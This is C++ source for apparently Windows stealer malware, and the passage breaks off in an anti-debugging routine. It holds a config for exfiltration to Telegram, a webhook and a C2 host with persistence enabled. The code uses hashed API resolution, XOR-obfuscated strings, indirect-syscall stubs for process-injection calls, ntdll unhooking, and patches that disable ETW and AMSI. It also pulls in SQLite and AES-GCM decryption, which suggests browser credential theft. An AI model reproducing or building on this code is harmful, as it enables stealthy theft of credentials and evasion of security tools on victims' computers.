// ByDoseUser - 403
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/err.h>
#include <fstream>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <memory>
#include <optional>
#include <mutex>
#include <map>
#include <algorithm>
#include <sstream>
#include <thread>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <chrono>
#include <cstring>
#include <regex>
#include <random>
#include <iomanip>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <shlobj.h>
#include <winhttp.h>
#include <wlanapi.h>
#include <iphlpapi.h>
#include <intrin.h>
#include <DbgHelp.h>
#include <comdef.h>
#include <comutil.h>
#include <wrl/client.h>
#include <objbase.h>
#include <atlbase.h>
#include <atlcom.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <WbemIdl.h>
#include <comutil.h>
#include <WbemCli.h>
#include <wincred.h>
#include <Lm.h>
#include <sddl.h>
#include <Ntsecapi.h>
#include <aclapi.h>
#include <schnlsp.h>
#include <wtsapi32.h>
#include <UserEnv.h>
#include <powrprof.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "zlib.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "powrprof.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "winsta.lib")
#pragma comment(lib, "shlwapi.lib")
using json = nlohmann::json;
namespace fs = std::filesystem;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
namespace {
    struct obfuscated_string {
        mutable std::string decrypted_cache;
        const char* encrypted;
        size_t length;
        char key;
        obfuscated_string(const char* enc, size_t len, char k) : encrypted(enc), length(len), key(k) {}
        const std::string& str() const {
            if (decrypted_cache.empty()) {
                decrypted_cache.assign(encrypted, length);
                for (char& c : decrypted_cache) c ^= key;
            }
            return decrypted_cache;
        }
        operator const std::string&() const { return str(); }
        const char* c_str() const { return str().c_str(); }
    };
}
#define OBFSTR(s) obfuscated_string(s, sizeof(s)-1, ((char)((sizeof(s) ^ 0x5A) & 0xFF)))
static const auto OBF_NTDLL = OBFSTR("\xFE\xFD\xFC\xFB\xFA\xF9\xF8\xF7\xF6\xF5");
static const auto OBF_KERNEL32 = OBFSTR("\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4");
static const auto OBF_CRYPT32 = OBFSTR("\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8");
static const auto OBF_ADVAPI32 = OBFSTR("\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91");
static const auto OBF_USER32 = OBFSTR("\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7");
static const auto OBF_SHELL32 = OBFSTR("\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F");
static const auto OBF_WINHTTP = OBFSTR("\x80\x81\x82\x83\x84\x85\x86\x87");
static const auto OBF_WLANAPI = OBFSTR("\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8");
static const auto OBF_IPHLPAPI = OBFSTR("\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8");
static const auto OBF_OLE32 = OBFSTR("\x68\x69\x6A\x6B\x6C\x6D");
static const auto OBF_OLEAUT32 = OBFSTR("\x50\x51\x52\x53\x54\x55\x56\x57\x58");
static const auto OBF_DBGNHELP = OBFSTR("\x40\x41\x42\x43\x44\x45\x46\x47\x48");
static const auto OBF_PSAPI = OBFSTR("\x30\x31\x32\x33\x34\x35");
static const auto OBF_WS2_32 = OBFSTR("\x20\x21\x22\x23\x24\x25\x26\x27");
static const auto OBF_WTSAPI32 = OBFSTR("\x10\x11\x12\x13\x14\x15\x16\x17\x18");
static const auto OBF_USERENV = OBFSTR("\x00\x01\x02\x03\x04\x05\x06\x07");
static const auto OBF_NETAPI32 = OBFSTR("\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80");
static const auto OBF_CREDUI = OBFSTR("\x58\x59\x5A\x5B\x5C\x5D");
static const auto OBF_POWRPROF = OBFSTR("\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F");
std::string decrypt_str(const std::string& input, char key) { std::string out = input; for (char& c : out) c ^= key; return out; }
std::wstring decrypt_wstr(const std::wstring& input, wchar_t key) { std::wstring out = input; for (wchar_t& c : out) c ^= key; return out; }
std::string wstr_to_utf8(const std::wstring& wstr) { if(wstr.empty()) return {}; int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL); std::string utf8(size, 0); WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &utf8[0], size, NULL, NULL); return utf8; }
std::wstring utf8_to_wstr(const std::string& str) { if(str.empty()) return {}; int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0); std::wstring wstr(size, 0); MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size); return wstr; }
std::string base64_encode(const std::vector<uint8_t>& data) { static const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"; std::string result; int val = 0, valb = -6; for(auto c : data) { val = (val << 8) + c; valb += 8; while(valb >= 0) { result.push_back(b64[(val >> valb) & 0x3F]); valb -= 6; } } if(valb > -6) result.push_back(b64[((val << 8) >> (valb + 8)) & 0x3F]); while(result.size() % 4) result.push_back('='); return result; }
std::vector<uint8_t> base64_decode(const std::string& encoded) { static const std::string b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"; std::vector<uint8_t> result; int val = 0, valb = -8; for(unsigned char c : encoded) { if(c == '=') break; size_t pos = b64.find(c); if(pos == std::string::npos) continue; val = (val << 6) + pos; valb += 6; if(valb >= 0) { result.push_back((val >> valb) & 0xFF); valb -= 8; } } return result; }
std::string random_string(size_t length) { const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; std::random_device rd; std::mt19937 gen(rd()); std::uniform_int_distribution<size_t> dist(0, strlen(charset) - 1); std::string result; result.reserve(length); for(size_t i = 0; i < length; ++i) result.push_back(charset[dist(gen)]); return result; }
DWORD djb2_hash(const char* str) { unsigned long hash = 5381; int c; while((c = *str++)) { hash = ((hash << 5) + hash) + c; } return (DWORD)hash; }
DWORD djb2_hash_w(const wchar_t* str) { unsigned long hash = 5381; int c; while((c = *str++)) { hash = ((hash << 5) + hash) + c; } return (DWORD)hash; }

FARPROC resolve_api_by_hash(HMODULE module, DWORD hash) {
    if (!module) return nullptr;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)module + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)module + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* fname = (char*)((BYTE*)module + names[i]);
        if (djb2_hash(fname) == hash)
            return (FARPROC)((BYTE*)module + funcs[ords[i]]);
    }
    return nullptr;
}

HMODULE get_module_handle_hash(DWORD hash) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;
    while (curr != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->DllBase) {
            std::wstring dll_name = entry->FullDllName.Buffer;
            std::transform(dll_name.begin(), dll_name.end(), dll_name.begin(), ::towlower);
            if (djb2_hash_w(dll_name.c_str()) == hash)
                return (HMODULE)entry->DllBase;
        }
        curr = curr->Flink;
    }
    return nullptr;
}

#define RESOLVE(mod_hash, func_hash) resolve_api_by_hash(get_module_handle_hash(mod_hash), func_hash)

std::vector<uint8_t> aes_gcm_decrypt(const std::vector<uint8_t>& key, const std::vector<uint8_t>& ciphertext) {
    if (ciphertext.size() < 28) return {};
    std::vector<uint8_t> nonce(ciphertext.begin(), ciphertext.begin() + 12);
    std::vector<uint8_t> tag(ciphertext.end() - 16, ciphertext.end());
    std::vector<uint8_t> ct(ciphertext.begin() + 12, ciphertext.end() - 16);
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, key.data(), nonce.data());
    std::vector<uint8_t> plaintext(ct.size() + 16);
    int len = 0, pLen = 0;
    EVP_DecryptUpdate(ctx, plaintext.data(), &len, ct.data(), (int)ct.size());
    EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &pLen);
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(len + pLen);
    return plaintext;
}
std::vector<uint8_t> aes_gcm_encrypt(const std::vector<uint8_t>& key, const std::vector<uint8_t>& plaintext) {
    std::vector<uint8_t> nonce(12);
    RAND_bytes(nonce.data(), 12);
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key.data(), nonce.data());
    std::vector<uint8_t> ciphertext(plaintext.size() + 16);
    int len = 0;
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), (int)plaintext.size());
    int pLen = 0;
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &pLen);
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(len + pLen);
    std::vector<uint8_t> result;
    result.insert(result.end(), nonce.begin(), nonce.end());
    result.insert(result.end(), ciphertext.begin(), ciphertext.end());
    return result;
}

struct Config {
    std::string telegram_bot_token;
    std::string telegram_chat_id;
    std::string webhook_url;
    std::string c2_host;
    int c2_port = 0;
    bool exfiltrate = true;
    bool compress = true;
    bool silent = true;
    bool anti_debug = true;
    bool persistence = true;
    int max_threads = 0;
    std::string output_format = "json";
    std::string output_dir = "C:\\ProgramData\\SystemCache";
    std::vector<std::string> browsers_filter;
};
Config g_config;
std::mutex g_output_mutex;
std::ofstream g_output_file;
json g_global_json;
std::atomic<size_t> g_output_count{0};
std::vector<uint8_t> g_syscall_gadget_bytes;
FARPROC g_syscall_gadget = nullptr;
PVOID g_clean_ntdll = nullptr;
SIZE_T g_clean_ntdll_size = 0;
HMODULE g_ntdll = nullptr;
std::map<DWORD, PVOID> g_ssn_stubs;
std::mutex g_stub_mutex;
struct SYSCALL_ENTRY { DWORD hash; DWORD ssn; PVOID address; };
std::vector<SYSCALL_ENTRY> g_syscalls;
std::map<DWORD, PVOID> g_syscall_original_syscall_insn;
std::map<DWORD, DWORD> g_syscall_ssn_cache;
std::vector<uint8_t> g_encryption_key(32, 0);
std::atomic<bool> g_running{true};
std::mutex g_sleep_mutex;
std::condition_variable g_sleep_cv;
std::vector<uint8_t> g_payload_cipher;
std::vector<uint8_t> g_payload_plain;
std::mutex g_anti_vm_check_mutex;

void xor_encrypt_decrypt_inplace(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
}

DWORD resolve_syscall_number(const char* name) {
    HMODULE ntdll = GetModuleHandleA(OBF_NTDLL.c_str());
    if (!ntdll) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdll + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)ntdll + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)ntdll + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)ntdll + exp->AddressOfFunctions);
    std::vector<std::pair<DWORD, DWORD>> addr_ssn;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* fname = (char*)((BYTE*)ntdll + names[i]);
        if (strncmp(fname, "Nt", 2) == 0 || strncmp(fname, "Zw", 2) == 0) {
            BYTE* addr = (BYTE*)ntdll + funcs[ords[i]];
            DWORD ssn = 0;
            for (int j = 0; j < 32; j++) {
                if (addr[j] == 0x0F && addr[j+1] == 0x05) {
                    ssn = *(DWORD*)(addr + j - 4) & 0xFFFF;
                    break;
                }
            }
            addr_ssn.push_back({(DWORD)addr, ssn});
        }
    }
    std::sort(addr_ssn.begin(), addr_ssn.end(), [](auto& a, auto& b){ return a.first < b.first; });
    DWORD target_addr = (DWORD)GetProcAddress(ntdll, name);
    if (!target_addr) return 0;
    for (size_t i = 0; i < addr_ssn.size(); i++) {
        if (addr_ssn[i].first == target_addr)
            return addr_ssn[i].second;
    }
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* fname = (char*)((BYTE*)ntdll + names[i]);
        if (strcmp(fname, name) == 0) {
            BYTE* addr = (BYTE*)ntdll + funcs[ords[i]];
            for (int j = 0; j < 32; j++) {
                if (addr[j] == 0x0F && addr[j+1] == 0x05) {
                    return *(DWORD*)(addr + j - 4) & 0xFFFF;
                }
            }
        }
    }
    return 0;
}

PVOID create_syscall_stub(DWORD ssn) {
    if (g_syscall_gadget == nullptr) return nullptr;
    BYTE stub_code[] = {
        0x4C, 0x8B, 0xD1,
        0xB8, (BYTE)(ssn & 0xFF), (BYTE)((ssn >> 8) & 0xFF), (BYTE)((ssn >> 16) & 0xFF), (BYTE)((ssn >> 24) & 0xFF),
        0xFF, 0x25, 0x02, 0x00, 0x00, 0x00,
        0xC3,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    SIZE_T totalSize = sizeof(stub_code);
    PVOID execMem = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return nullptr;
    memcpy(execMem, stub_code, sizeof(stub_code));
    *(PVOID*)((BYTE*)execMem + 16) = g_syscall_gadget;
    return execMem;
}

NTSTATUS indirect_syscall(DWORD ssn, PVOID stub, ...) {
    if (!stub) return STATUS_UNSUCCESSFUL;
    using NtFunc = NTSTATUS(NTAPI*)(...);
    NtFunc func = (NtFunc)stub;
    return func();
}

NTSTATUS NtAllocateVirtualMemory_wrapper(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtAllocateVirtualMemory"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtAllocateVirtualMemory")] = stub; }
    return indirect_syscall(ssn, stub, ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}
NTSTATUS NtWriteVirtualMemory_wrapper(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtWriteVirtualMemory"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtWriteVirtualMemory")] = stub; }
    return indirect_syscall(ssn, stub, ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}
NTSTATUS NtProtectVirtualMemory_wrapper(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtProtectVirtualMemory"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtProtectVirtualMemory")] = stub; }
    return indirect_syscall(ssn, stub, ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}
NTSTATUS NtCreateThreadEx_wrapper(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtCreateThreadEx"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtCreateThreadEx")] = stub; }
    return indirect_syscall(ssn, stub, ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}
NTSTATUS NtQueueApcThread_wrapper(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtQueueApcThread"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtQueueApcThread")] = stub; }
    return indirect_syscall(ssn, stub, ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3);
}
NTSTATUS NtTestAlert_wrapper() {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtTestAlert"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtTestAlert")] = stub; }
    return indirect_syscall(ssn, stub);
}
NTSTATUS NtOpenProcessToken_wrapper(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtOpenProcessToken"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtOpenProcessToken")] = stub; }
    return indirect_syscall(ssn, stub, ProcessHandle, DesiredAccess, TokenHandle);
}
NTSTATUS NtDuplicateToken_wrapper(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE NewTokenHandle) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtDuplicateToken"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtDuplicateToken")] = stub; }
    return indirect_syscall(ssn, stub, ExistingTokenHandle, DesiredAccess, ObjectAttributes, ImpersonationLevel, TokenType, NewTokenHandle);
}
NTSTATUS NtQueryInformationProcess_wrapper(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtQueryInformationProcess"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtQueryInformationProcess")] = stub; }
    return indirect_syscall(ssn, stub, ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
}
NTSTATUS NtSetInformationThread_wrapper(HANDLE ThreadHandle, THREAD_INFORMATION_CLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtSetInformationThread"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtSetInformationThread")] = stub; }
    return indirect_syscall(ssn, stub, ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength);
}
NTSTATUS NtUnmapViewOfSection_wrapper(HANDLE ProcessHandle, PVOID BaseAddress) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtUnmapViewOfSection"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtUnmapViewOfSection")] = stub; }
    return indirect_syscall(ssn, stub, ProcessHandle, BaseAddress);
}
NTSTATUS NtCreateSection_wrapper(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtCreateSection"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtCreateSection")] = stub; }
    return indirect_syscall(ssn, stub, SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
}
NTSTATUS NtMapViewOfSection_wrapper(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtMapViewOfSection"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtMapViewOfSection")] = stub; }
    return indirect_syscall(ssn, stub, SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
}
NTSTATUS NtResumeThread_wrapper(HANDLE ThreadHandle, PULONG SuspendCount) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtResumeThread"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtResumeThread")] = stub; }
    return indirect_syscall(ssn, stub, ThreadHandle, SuspendCount);
}
NTSTATUS NtClose_wrapper(HANDLE Handle) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtClose"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtClose")] = stub; }
    return indirect_syscall(ssn, stub, Handle);
}
NTSTATUS NtCreateProcess_wrapper(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtCreateProcess"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtCreateProcess")] = stub; }
    return indirect_syscall(ssn, stub, ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess, Flags, SectionHandle, DebugPort, ExceptionPort);
}
NTSTATUS NtQuerySystemInformation_wrapper(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtQuerySystemInformation"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtQuerySystemInformation")] = stub; }
    return indirect_syscall(ssn, stub, SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
}
NTSTATUS NtDelayExecution_wrapper(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) {
    static DWORD ssn = 0; static PVOID stub = nullptr;
    if (!stub) { ssn = resolve_syscall_number("NtDelayExecution"); stub = create_syscall_stub(ssn); if(stub) g_ssn_stubs[djb2_hash("NtDelayExecution")] = stub; }
    return indirect_syscall(ssn, stub, Alertable, DelayInterval);
}

void unhook_ntdll() {
    HMODULE ntdll = GetModuleHandleA(OBF_NTDLL.c_str());
    HANDLE hFile = CreateFileA(decrypt_str("D:\\Xibfqxt\\Tz{wmj64\\swepp.wnn", 3).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { NtClose_wrapper(hFile); return; }
    LPVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) { NtClose_wrapper(hMapping); NtClose_wrapper(hFile); return; }
    g_clean_ntdll = pClean;
    g_clean_ntdll_size = GetFileSize(hFile, NULL);
    PIMAGE_DOS_HEADER dosClean = (PIMAGE_DOS_HEADER)pClean;
    PIMAGE_NT_HEADERS ntClean = (PIMAGE_NT_HEADERS)((BYTE*)pClean + dosClean->e_lfanew);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(ntClean);
    for (int i = 0; i < ntClean->FileHeader.NumberOfSections; i++) {
        if (sect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD oldProtect;
            VirtualProtect((BYTE*)ntdll + sect[i].VirtualAddress, sect[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((BYTE*)ntdll + sect[i].VirtualAddress, (BYTE*)pClean + sect[i].VirtualAddress, sect[i].Misc.VirtualSize);
            VirtualProtect((BYTE*)ntdll + sect[i].VirtualAddress, sect[i].Misc.VirtualSize, oldProtect, &oldProtect);
        }
    }
    for (int i = 0; i < ntClean->FileHeader.NumberOfSections; i++) {
        if (sect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE* base = (BYTE*)ntdll + sect[i].VirtualAddress;
            SIZE_T size = sect[i].Misc.VirtualSize;
            for (SIZE_T j = 0; j < size - 2; j++) {
                if (base[j] == 0x0F && base[j+1] == 0x05) { g_syscall_gadget = (FARPROC)(base + j); break; }
            }
            if (g_syscall_gadget) break;
        }
    }
    if (!g_syscall_gadget) {
        for (SIZE_T i = 0; i < g_clean_ntdll_size - 2; i++) {
            if (((BYTE*)pClean)[i] == 0x0F && ((BYTE*)pClean)[i+1] == 0x05) {
                g_syscall_gadget = (FARPROC)((BYTE*)ntdll + i);
                break;
            }
        }
    }
    UnmapViewOfFile(pClean);
    NtClose_wrapper(hMapping);
    NtClose_wrapper(hFile);
}

void patch_etw() {
    HMODULE ntdll = GetModuleHandleA(OBF_NTDLL.c_str());
    if (!ntdll) return;
    PVOID pEtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    ((BYTE*)pEtwEventWrite)[0] = 0x48; ((BYTE*)pEtwEventWrite)[1] = 0x31; ((BYTE*)pEtwEventWrite)[2] = 0xC0; ((BYTE*)pEtwEventWrite)[3] = 0xC3;
    VirtualProtect(pEtwEventWrite, 16, oldProtect, &oldProtect);
}

void patch_amsi() {
    HMODULE amsi = LoadLibraryA(decrypt_str("jvzh5fmm", 2).c_str());
    if (!amsi) return;
    PVOID pAmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return;
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    ((BYTE*)pAmsiScanBuffer)[0] = 0x48; ((BYTE*)pAmsiScanBuffer)[1] = 0x31; ((BYTE*)pAmsiScanBuffer)[2] = 0xC0; ((BYTE*)pAmsiScanBuffer)[3] = 0xC3;
    VirtualProtect(pAmsiScanBuffer, 16, oldProtect, &oldProtect);
}

bool is_debugged() {
    if (IsDebuggerPresent()) return true;
    DWORD debugPort = 0;
    ULONG returnLength;
    if (NtQueryInformationProcess_wrapper(GetCurrentProcess(), ProcessDebugPort, &debugPort, sizeof(debugPort), &returnLength) == 0 && debugPort != 0) return true;
